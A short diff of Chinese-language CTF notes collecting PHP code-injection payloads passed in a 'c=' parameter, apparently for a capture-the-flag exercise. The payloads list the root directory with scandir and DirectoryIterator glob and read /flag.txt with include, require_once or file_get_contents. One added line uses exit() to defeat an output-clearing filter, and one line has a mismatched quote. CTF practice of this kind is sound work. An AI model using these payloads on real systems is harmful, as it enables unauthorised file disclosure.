@@ -23,9 +23,13 @@ c=require_once('/flag.txt');
 查目录
 ```
 c=var_dump(scandir('/'));
+
 c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}//glob的作用是规定后面的匹配格式，查找匹配的文件路径模式
 
 c=$a=scandir("/");foreach($a as $key=>$value){echo $key."=>".$value;}
+
+c=var_export(scandir('/'));exit(); //停掉后面的限制函数如ob_end_clean()会清除缓冲不会输出内容。
+c=include('/flag.txt');die();
 ```
 ```
 print_r(file_get_contents(/flagg')); //打印获取文件的内容
